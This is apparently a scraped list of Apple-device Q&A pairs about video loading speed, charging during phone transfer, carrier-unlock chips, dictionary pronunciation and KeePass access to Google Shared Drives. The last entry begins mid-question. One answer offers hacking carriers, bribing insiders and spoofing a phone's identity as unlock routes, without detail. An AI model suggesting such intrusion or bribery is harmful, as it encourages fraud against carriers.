Which loads YouTube videos faster, the iPhone A15 chip, the iPad Mini A15, or the iPad Pro M1, and why?\n\nA: The question is not very specific, so it's hard to really say much here.\nIn general, loading in a YouTube is a very small task for either of those CPUs. The bottleneck usually lies within the network, not the CPU. So the actual speed of loading in the YouTube video depends on your WiFi speed, cellular signal strength, or whatever method of transport, you're using.\nIf you look only at the CPUs themselves, I would say that this is a tie. They will probably all load the video for you at the same speed in any practical sense.\n", "Q: Old iPhone won't charge during \"quick\" transfer to new phone! I’m using phone-phone transfer as part of the process of upgrading to a new iPhone, but the old phone refuses to charge. It appears to be in some mode where it won’t take a charge, and now it’s a race against time! Setting aside the question of how that is even possible (is there a software mode that prevents charging; why would it go on, even as a bug, during such a critical process) what are my options to ensure that the process completes? What can I do to keep my old phone alive until the process is done?\n\nA: I faced this identical problem a few years ago. The only way I was able to upgrade was to restore from an iTunes backup.\nRemember to set the backup to be encrypted so various sensitive items like account setups and passwords are transferred over, or you will have to recreate a host of logins.\nYou can also use iCloud backup, too, if you have no local Mac or PC to perform the backup. I have not tried this myself, but several of my clients have done so with 100% success.\n", "Q: How do the iPhone unlock chips work? It seems like there's no questions about unlocking iPhones here so forgive me if this is counted as off-topic.\nI recently received an iPhone 7 from a friend that is locked to Sprint's network through what I think is a US Reseller policy which is a special kind of SIM lock that isn't done through a carrier but by the phone itself. I've been trying to find ways around unlocking the phone - it's near impossible. One route I've considered is purchasing an unlocking chip that some people sell (I'm not going to provide a link because I'm not sure that they're not a scam, that's part of what I'm trying to understand).\nMy question is how do unlocking chips work?\n\nA: So, the carriers collectively manage a database of identities they all agree to block so to get your device unblocked - there are four avenues:\n\n*\n\n*Hack into the carriers and change it without them knowing.\n\n*Social engineer the carriers (bribe / inside job) to have someone with access ignore the rules.\n\n*Convince the carriers the rules have been followed and get a proper unlock.\n\n*Hack the phone so that it has a “new” identity.\n\nSince you mention a “chip” I’m guessing you seek more details on #4 but unless that CHIP is a hardware modification, it’s likely #4 but could be any of the three other options if it’s a legit attempt to get your device working again.\nIt could also be a scam.\n", "Q: The IPA in Oxford Dictionary of English is wrong Rope should be ɹəʊp but the built-in Oxford Dictionary of English displays it as rəʊp\nHow can I fix this?\n\nA: If you don't like something in one of the Oxford dictionaries, you have to contact the publisher and ask for a change.

Not Keepassium, not StrongBox, not KeePassTouch, ... nothing.   The shortcut trick results in multiple versions of the same file nightmare - especially for password databases.  Is there some configuration setting that be set?  Otherwise, what is the purpose of \"Shared Drives\" on the iPhone if they cannot be used?\n\nA: It sounds like your Workplace administrator has restricted the access to work-related Google services from unmanaged (personal) apps. Which does make sense security-wise.\nThe solution would be to install your favorite KeePass flavor as a work app. To do so, your Workplace administrator should add the app to the Google Admin console. (Admin Console home → Apps → Web and mobile apps → Add app → … → Make this a managed app.)\nDisclaimers: I am the author of KeePassium. The answer is purely theoretical, based on some understanding of app management and Google documentation.\n"]
